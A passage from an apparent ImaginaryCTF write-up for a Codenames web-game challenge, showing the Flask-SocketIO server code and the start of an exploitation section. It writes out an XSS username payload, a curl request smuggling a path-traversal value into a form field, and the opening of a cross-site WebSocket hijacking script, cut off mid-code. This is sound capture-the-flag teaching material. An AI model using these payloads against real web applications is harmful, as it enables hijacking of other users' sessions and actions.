            <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">bots</span><span class="sh">'</span><span class="p">].</span><span class="nf">append</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="c1"># when both players have joined via WebSocket, send start_game to each individually
</span>    <span class="c1"># ensure game has two players and both have connected
</span>    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">,</span> <span class="p">[]))</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">sids</span><span class="sh">'</span><span class="p">,</span> <span class="p">{}))</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="c1"># common payload for both roles
</span>        <span class="n">payload_common</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">board</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">board</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">team_color</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">team_color</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="c1"># send full colors to clue giver, omit for guesser
</span>        <span class="k">for</span> <span class="n">player</span><span class="p">,</span> <span class="n">sid</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">sids</span><span class="sh">'</span><span class="p">].</span><span class="nf">items</span><span class="p">():</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">payload_common</span><span class="p">.</span><span class="nf">copy</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">player</span> <span class="o">==</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">]:</span>
                <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">]</span>
            <span class="nf">emit</span><span class="p">(</span><span class="sh">'</span><span class="s">start_game</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">room</span><span class="o">=</span><span class="n">sid</span><span class="p">)</span>

<span class="nd">@socketio.on</span><span class="p">(</span><span class="sh">'</span><span class="s">give_clue</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">on_give_clue</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">code</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] code </span><span class="si">{</span><span class="n">code</span><span class="si">}</span><span class="s"> game </span><span class="si">{</span><span class="n">game</span><span class="si">}</span><span class="s"> user </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>


    <span class="c1"># only clue giver can send clues
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">user</span> <span class="o">!=</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">User is not the clue giver (</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> != </span><span class="si">{</span><span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">clue</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">number</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">clue</span>
    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">num</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[i] Emitting the given clue with number </span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>

    <span class="nf">emit</span><span class="p">(</span><span class="sh">'</span><span class="s">clue_given</span><span class="sh">'</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">:</span> <span class="n">clue</span><span class="p">,</span> <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="n">num</span><span class="p">},</span> <span class="n">room</span><span class="o">=</span><span class="n">code</span><span class="p">)</span>

<span class="nd">@socketio.on</span><span class="p">(</span><span class="sh">'</span><span class="s">make_guess</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">on_make_guess</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">code</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="c1"># only guesser and when guesses remain
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">user</span> <span class="o">==</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="c1"># extract index of guessed cell
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">idx</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="c1"># validate index and reveal state
</span>    <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">board</span><span class="sh">'</span><span class="p">])</span> <span class="ow">or</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">][</span><span class="n">idx</span><span class="p">]:</span>
        <span class="k">return</span>
    <span class="n">word</span> <span class="o">=</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">board</span><span class="sh">'</span><span class="p">][</span><span class="n">idx</span><span class="p">]</span>
    <span class="n">color</span> <span class="o">=</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">][</span><span class="n">idx</span><span class="p">]</span>
    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">][</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="c1"># scoring: +1 for your team, -1 for opponent, 0 for neutral
</span>    <span class="n">team</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">team_color</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">color</span> <span class="o">==</span> <span class="n">team</span><span class="p">:</span>
        <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">elif</span> <span class="n">color</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">neutral</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="c1"># decrement guesses
</span>    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="c1"># check lose condition: assassin, negative score, or opponent pick in hard mode
</span>    <span class="n">opponent</span> <span class="o">=</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span> <span class="k">if</span> <span class="n">team</span> <span class="o">==</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span> <span class="k">else</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span>
    <span class="n">hard_mode</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">lose_flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">color</span> <span class="o">==</span> <span class="sh">'</span><span class="s">assassin</span><span class="sh">'</span> <span class="ow">or</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="p">(</span><span class="n">hard_mode</span> <span class="ow">and</span> <span class="n">color</span> <span class="o">==</span> <span class="n">opponent</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">lose_flag</span><span class="p">:</span>
        <span class="c1"># determine lose message
</span>        <span class="k">if</span> <span class="n">hard_mode</span> <span class="ow">and</span> <span class="n">color</span> <span class="o">==</span> <span class="n">opponent</span><span class="p">:</span>
            <span class="n">lose_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Sorry, in Hard Mode you guessed the opposing team</span><span class="sh">'</span><span class="s">s word. You lost!</span><span class="sh">"</span>
        <span class="k">elif</span> <span class="n">color</span> <span class="o">==</span> <span class="sh">'</span><span class="s">assassin</span><span class="sh">'</span><span class="p">:</span>
            <span class="n">lose_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Sorry, you hit the assassin. You lost!</span><span class="sh">"</span>
        <span class="k">elif</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">lose_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Sorry, your score went negative. You lost!</span><span class="sh">"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">lose_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Sorry, you lost!</span><span class="sh">"</span>
        <span class="nf">emit</span><span class="p">(</span><span class="sh">'</span><span class="s">update</span><span class="sh">'</span><span class="p">,</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">:</span> <span class="n">idx</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">color</span><span class="sh">'</span><span class="p">:</span> <span class="n">color</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">lose</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">lose_msg</span><span class="sh">'</span><span class="p">:</span> <span class="n">lose_msg</span>
        <span class="p">},</span> <span class="n">room</span><span class="o">=</span><span class="n">code</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="c1"># check win condition: all your team words revealed
</span>    <span class="n">win_flag</span> <span class="o">=</span> <span class="nf">all</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">col</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">])</span> <span class="k">if</span> <span class="n">col</span> <span class="o">==</span> <span class="n">team</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">win_flag</span><span class="p">:</span>
        <span class="c1"># award wins (double if hard mode)
</span>        <span class="n">bonus</span> <span class="o">=</span> <span class="mi">2</span> <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">)</span> <span class="k">else</span> <span class="mi">1</span>
        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">]:</span>
            <span class="n">profile</span> <span class="o">=</span> <span class="nf">load_profile</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">profile</span><span class="p">:</span>
                <span class="n">profile</span><span class="p">[</span><span class="sh">'</span><span class="s">wins</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">profile</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">wins</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">bonus</span>
                <span class="nf">save_profile</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span>
        <span class="c1"># prepare payload, including flag if bot is in game and hard mode
</span>        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">:</span> <span class="n">idx</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">color</span><span class="sh">'</span><span class="p">:</span> <span class="n">color</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">win</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">wins_awarded</span><span class="sh">'</span><span class="p">:</span> <span class="n">bonus</span>
        <span class="p">}</span>
        <span class="c1"># cooperative bot wins when human wins
</span>        <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">):</span>
            <span class="c1"># include flag if a bot is in this game
</span>            <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">bots</span><span class="sh">'</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">flag</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">FLAG_2</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
                    <span class="k">pass</span>
        <span class="nf">emit</span><span class="p">(</span><span class="sh">'</span><span class="s">update</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">room</span><span class="o">=</span><span class="n">code</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="c1"># normal update
</span>    <span class="nf">emit</span><span class="p">(</span><span class="sh">'</span><span class="s">update</span><span class="sh">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">:</span> <span class="n">idx</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">color</span><span class="sh">'</span><span class="p">:</span> <span class="n">color</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">],</span>
        <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">],</span>
        <span class="sh">'</span><span class="s">win</span><span class="sh">'</span><span class="p">:</span> <span class="bp">False</span>
    <span class="p">},</span> <span class="n">room</span><span class="o">=</span><span class="n">code</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">socketio</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div>  </div>

</details>

<h1 id="exploitation">Exploitation</h1>

<h3 id="goal"><span class="me-2">Goal</span><a href="#goal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>My goal is to find an <strong>XSS</strong> to weaponize it into a <strong>Cross-Site WebSocket Hijacking</strong> vulnerability. With the <strong>CSWSH</strong>, I will trick the bot into giving us a huge <code class="language-plaintext highlighter-rouge">guesses_remaining</code> number, so that we can check <strong>every</strong> word.
To do so, we need to trick the bot into <strong>emitting</strong> a <code class="language-plaintext highlighter-rouge">give_clue</code> WebSocket event, because only <strong>clue_giver</strong> can emit this event. The bot is the <strong>clue_giver</strong> of the game, because he is the second player to join it. That means he is the only one who can give clues, and overwrite <code class="language-plaintext highlighter-rouge">game["guesses_remaining"]</code>.</p>

<p>When emiting <code class="language-plaintext highlighter-rouge">give_clue</code>, the clue_giver specifies a number that will be used by the code as follows:</p>
<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c1"># Get the "number" parameter given by the clue_giver 
# in the emit event
</span><span class="n">num</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">number</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

<span class="c1"># Assign this number into the "guesses_remaining" number
</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">num</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Basically the backend overwrites the value of <code class="language-plaintext highlighter-rouge">game['guesses_remaining']</code>.
When we try to play <em>(aka to emit a <code class="language-plaintext highlighter-rouge">make_guess</code> WebSocket event)</em>, The backend doesn’t check for “win” or “lose” or whatever state, it only checks if <strong><code class="language-plaintext highlighter-rouge">guesses_remaining is &gt;= 0</code></strong>:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c1"># only guesser and when guesses remain
</span><span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">user</span> <span class="o">==</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">game</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">return</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In other words, if we have a high number of <code class="language-plaintext highlighter-rouge">guesses_remaining</code> and we are not clue giver we can test all words until all our words are displayed.</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">win_flag</span> <span class="o">=</span> <span class="nf">all</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">col</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">])</span> <span class="k">if</span> <span class="n">col</span> <span class="o">==</span> <span class="n">team</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If all our words are displayed, <code class="language-plaintext highlighter-rouge">win_flag</code> will be equal to <code class="language-plaintext highlighter-rouge">True</code>, and the backend will give us the flag.</p>

<h3 id="confirm-xss"><span class="me-2">Confirm XSS</span><a href="#confirm-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>If we create a user with this name:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;img src=x onerror='alert(1)'&gt;.txt
</pre></td></tr></tbody></table></code></div></div>

<p>Then create a game using the path traversal trick seen in <strong>codenames-1</strong> on this URL:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">-X</span> POST <span class="s2">"http://34.72.72.63:15703/create_game"</span> <span class="se">\ </span> 
  <span class="nt">-H</span> <span class="s1">'Cookie: session=eyJpc19ib3QiOmZhbHNlLCJ1c2VybmFtZSI6IjxpbWcgc3JjPXggb25lcnJvcj0nYWxlcnQoMSknPi50eHQifQ.aL1CHg.RnimUkggq4TRXEGH-PnpL8Y1H5I'</span> <span class="se">\</span>
  <span class="nt">-d</span> <span class="s2">"language=/app/profiles/&lt;img src=x onerror='alert(1)'&gt;"</span>
</pre></td></tr></tbody></table></code></div></div>

<div file="response" class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="response"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">en</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You should be redirected automatically to the target URL: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/game/6MPPJ6"</span><span class="nt">&gt;</span>/game/6MPPJ6<span class="nt">&lt;/a&gt;</span>. If not, click the link.
</pre></td></tr></tbody></table></code></div></div>

<p>Then access <a href="http://34.72.72.63:15703/game/T47RBD">http://34.72.72.63:15703/game/T47RBD</a>, then hit the <kbd>Add bot</kbd> button:</p>

<p><a href="/assets/img/writeups/ImaginaryCTF/we_have_xss.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/we_have_xss.png" alt="index"  loading="lazy"></a>
<em>We have an XSS !</em></p>

<h3 id="exploit-cswsh"><span class="me-2">Exploit CSWSH</span><a href="#exploit-cswsh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h5 id="crafting-the-payload"><span class="me-2">Crafting the payload</span><a href="#crafting-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>Since we have XSS, it’ll be really easy to obtain Cross-Site WebSocket Hijacking. Here is the payload that I used:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">// Get the 6 last chars of the URL, URL is in format http://34.72.72.63:15703/game/6MPPJ6</span>
<span class="nx">game_code</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">).</span><span class="nf">slice</span><span class="p">(</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span>

<span class="c1">// Open a websocket to the game</span>
